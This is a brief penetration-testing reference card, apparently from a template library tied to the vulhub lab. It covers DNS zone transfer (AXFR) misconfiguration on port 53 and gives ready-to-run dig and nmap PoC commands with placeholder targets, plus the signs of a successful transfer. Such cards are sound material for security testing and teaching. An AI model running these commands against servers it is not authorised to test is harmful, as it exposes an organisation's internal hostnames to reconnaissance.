# DNS Zone Transfers (AXFR)

## 指纹特征
- 服务: DNS (Bind9 等)
- 端口: 53 (TCP/UDP)
- 协议: DNS

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| AXFR 记录请求 | 端口 53 | 无 (取决于配置) |

## PoC 指令

通过 `dig` 命令请求指定域名的全量区域传输记录：

```bash
dig @{{TARGET}} -t axfr {{DOMAIN}}
```

**示例**:
```bash
dig @{{TARGET}} -t axfr vulhub.org
```

使用 Nmap 脚本扫描：
```bash
nmap --script dns-zone-transfer.nse --script-args "dns-zone-transfer.domain={{DOMAIN}}" -Pn -p 53 {{TARGET}}
```

## Success Signal
- **响应内容**: 响应中包含大量的 A 记录、CNAME 记录等（如 `admin.vulhub.org`, `db.vulhub.org`）。
- **Nmap 结果**: 输出 `Transfer Successful` 及子域名列表。
